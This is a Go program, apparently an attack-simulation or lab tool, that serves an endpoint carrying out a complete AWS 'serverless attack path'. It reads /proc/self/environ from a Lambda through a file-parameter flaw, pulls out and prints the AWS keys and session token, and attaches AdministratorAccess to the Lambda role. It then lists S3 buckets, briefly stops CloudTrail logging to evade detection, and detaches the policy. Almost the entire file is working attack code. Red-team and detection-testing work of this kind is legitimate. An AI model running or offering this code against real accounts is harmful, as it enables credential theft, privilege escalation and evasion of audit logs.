package main

import (
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"

	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/cloudtrail"
	"github.com/aws/aws-sdk-go/service/iam"
	"github.com/aws/aws-sdk-go/service/s3"
	"github.com/aws/aws-sdk-go/service/sts"
)

func getEnvironData(apiURL string) (string, error) {
	resp, err := http.Get(apiURL)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	data := make([]byte, 2048)
	n, err := resp.Body.Read(data)
	if err != nil {
		return "", err
	}

	return string(data[:n]), nil
}

func parseAwsCredentials(environData string) (string, string, string) {
	awsSessionTokenPattern := `AWS_SESSION_TOKEN=(.*?)\n`
	awsAccessKeyIDPattern := `AWS_ACCESS_KEY_ID=(.*?)\n`
	awsSecretAccessKeyPattern := `AWS_SECRET_ACCESS_KEY=(.*?)\n`

	awsSessionToken := regexp.MustCompile(awsSessionTokenPattern).FindStringSubmatch(environData)[1]
	awsAccessKeyID := regexp.MustCompile(awsAccessKeyIDPattern).FindStringSubmatch(environData)[1]
	awsSecretAccessKey := regexp.MustCompile(awsSecretAccessKeyPattern).FindStringSubmatch(environData)[1]

	fmt.Printf("KEYID: %s\n", awsAccessKeyID)
	fmt.Printf("SECRET: %s\n", awsSecretAccessKey)
	fmt.Printf("TOKEN: %s\n", awsSessionToken)

	return awsAccessKeyID, awsSecretAccessKey, awsSessionToken
}

func assumeRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken string) string {
	cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}

	svc := sts.New(session.New(), cfg)

	params := &sts.GetCallerIdentityInput{}

	resp, err := svc.GetCallerIdentity(params)
	if err != nil {
		log.Println(err)
		return ""
	}

	return *resp.Arn
}

func attachAdminPolicyToRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, roleName string) {
	cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}

	svc := iam.New(session.New(), cfg)

	arn := "arn:aws:iam::aws:policy/AdministratorAccess"
	params := &iam.AttachRolePolicyInput{
		PolicyArn: aws.String(arn),
		RoleName:  aws.String(roleName),
	}

	_, err := svc.AttachRolePolicy(params)
	if err != nil {
		log.Println(err)
		return
	}
}

func listS3Buckets(s3_svc *s3.S3) []*s3.Bucket {
	params := &s3.ListBucketsInput{}
	resp, err := s3_svc.ListBuckets(params)
	if err != nil {
		log.Println(err)
		return nil
	}

	return resp.Buckets
}

func checkBucketConfig(s3Svc *s3.S3, bucketName string) (string, string) {
	loggingStatus := "Disabled"
	aclStatus := "Unknown"

	// Get bucket logging status
	params := &s3.GetBucketLoggingInput{
		Bucket: aws.String(bucketName),
	}
	_, err := s3Svc.GetBucketLogging(params)
	if err != nil {
		if aerr, ok := err.(awserr.Error); ok && aerr.Code() == "NoSuchBucket" {
			loggingStatus = "Bucket not found"
		} else {
			log.Println(err)
		}
	} else {
		loggingStatus = "Enabled"
	}

	// Check bucket ACL status
	params2 := &s3.GetBucketAclInput{
		Bucket: aws.String(bucketName),
	}
	_, err2 := s3Svc.GetBucketAcl(params2)
	if err2 != nil {
		if aerr, ok := err2.(awserr.Error); ok && aerr.Code() == "NoSuchBucket" {
			aclStatus = "Bucket not found"
		} else {
			log.Println(err2)
		}
	} else {
		aclStatus = "Exists"
	}

	return loggingStatus, aclStatus
}

func stopCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName string) bool {
	cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}

	svc := cloudtrail.New(session.New(), cfg)

	params := &cloudtrail.DescribeTrailsInput{
		TrailNameList: []*string{aws.String(trailName)},
	}

	resp, err := svc.DescribeTrails(params)
	if err != nil {
		log.Println(err)
		return false
	}

	if len(resp.TrailList) > 0 {
		trail := resp.TrailList[0]
		if *trail.Name == trailName {
			params := &cloudtrail.StopLoggingInput{
				Name: &trailName,
			}

			_, err := svc.StopLogging(params)
			if err != nil {
				log.Println(err)
				return false
			}

			fmt.Printf("CloudTrail logging for '%s' has been stopped.\n", trailName)
			return true
		}
		fmt.Printf("Error: Trail '%s' not found.\n", trailName)
		return false
	}

	fmt.Printf("Error: Unable to retrieve trail information.\n")
	return false
}

func startCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName string) bool {
	cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}

	svc := cloudtrail.New(session.New(), cfg)

	params := &cloudtrail.StartLoggingInput{
		Name: &trailName,
	}

	_, err := svc.StartLogging(params)
	if err != nil {
		log.Println(err)
		return false
	}

	fmt.Printf("CloudTrail logging for '%s' has been re-enabled.\n", trailName)
	return true
}

// Struct for a simple JSON response
type jsonResponse struct {
	Message string `json:"message"`
}

func serverlesspathHandler(w http.ResponseWriter, r *http.Request) {
	region := os.Getenv("REGION")
	// Log the request and Log the AGW_URL environment variable value
	log.Printf("Received request for /serverlesspath from %s", r.RemoteAddr)
	illegalAccess := os.Getenv("AGW_URL") + "?file=/proc/self/environ"
	log.Printf("Generating Malicous Endpoint URL: %s", illegalAccess)

	// Call API+Lambda to Get its Variable Values
	environData, err := getEnvironData(illegalAccess)
	if err != nil {
		log.Fatal(err)
	}

	awsAccessKeyID, awsSecretAccessKey, awsSessionToken := parseAwsCredentials(environData)

	stolen_cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}

	s3_svc := s3.New(session.New(), stolen_cfg)

	// Assume the IAM Role and provide back the ARN and Role Name
	callerIdentity := assumeRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken)
	fmt.Printf("AssumedRoleARN: %s\n", callerIdentity)
	segment := strings.Split(callerIdentity, "/")
	roleName := segment[len(segment)-2]
	fmt.Printf("VulnerableLambdaRoleName: %s\n", roleName)

	// Permissions Elevated to perform more actions
	attachAdminPolicyToRole(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, roleName)
	time.Sleep(8 * time.Second)

	// Enumerate S3 Services and Configurations
	buckets := listS3Buckets(s3_svc)
	bucketCount := 0

	for _, bucket := range buckets {
		bucketName := *bucket.Name
		loggingStatus, aclStatus := checkBucketConfig(s3_svc, bucketName)

		fmt.Printf("Bucket Name: %s\n", bucketName)
		fmt.Printf("Logging Status: %s\n", loggingStatus)
		fmt.Printf("S3 ACL Status: %s\n", aclStatus)
		fmt.Println()

		bucketCount++
		if bucketCount >= 5 {
			break
		}
	}

	// Vision on model for next steps of workflow
	trailName := os.Getenv("CT_NAME")
	stopCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName)
	time.Sleep(5 * time.Second)
	startCloudTrailLogging(region, awsAccessKeyID, awsSecretAccessKey, awsSessionToken, trailName)

	cfg := &aws.Config{
		Region:      aws.String(region),
		Credentials: credentials.NewStaticCredentials(awsAccessKeyID, awsSecretAccessKey, awsSessionToken),
	}
	iamSvc := iam.New(session.New(), cfg)

	policyArn := "arn:aws:iam::aws:policy/AdministratorAccess"
	params := &iam.DetachRolePolicyInput{
		PolicyArn: aws.String(policyArn),
		RoleName:  aws.String(roleName),
	}

	_, err = iamSvc.DetachRolePolicy(params)
	if err != nil {
		log.Println(err)
	}
	// Create a JSON response
	response := struct {
		EndpointURLTargeted   string `json:"EndpointURLTargeted"`
		AssumedLambdaRoleName string `json:"AssumedLambdaRoleName"`
		AssumedRoleARN        string `json:"AssumedRoleARN"`
		EscalatePrivileges    string `json:"EscalatePrivileges"`
		ServiceEnumeration    string `json:"ServiceEnumeration"`
		DefensiveEvasion      string `json:"DefensiveEvasion"`
	}{
		EndpointURLTargeted:   illegalAccess,
		AssumedLambdaRoleName: roleName,
		AssumedRoleARN:        callerIdentity,
		EscalatePrivileges:    "attaching: arn:aws:iam::aws:policy/AdministratorAccess",
		ServiceEnumeration:    "Enumerating through S3 Resources checking ACL Configurations",
		DefensiveEvasion:      "Temporarily impairing CloudTrail Logging on: " + trailName,
	}
	// Set content type to JSON before writing the body
	w.Header().Set("Content-Type", "application/json")

	if err := json.NewEncoder(w).Encode(response); err != nil {
		log.Println("Error encoding JSON response:", err)
		w.WriteHeader(http.StatusInternalServerError)
	}
}

// entry point
func main() {
	// Define the /serverlesspath route and its handler
	mux := http.NewServeMux()
	mux.HandleFunc("/serverless/attack", serverlesspathHandler)

	// Start the HTTP server on your chosen port
	port := "4200"
	fmt.Printf("Serverless Attack Path server is running on port %s...\n", port)
	if err := http.ListenAndServe(":"+port, mux); err != nil {
		log.Fatal("Error starting server:", err)
	}
}
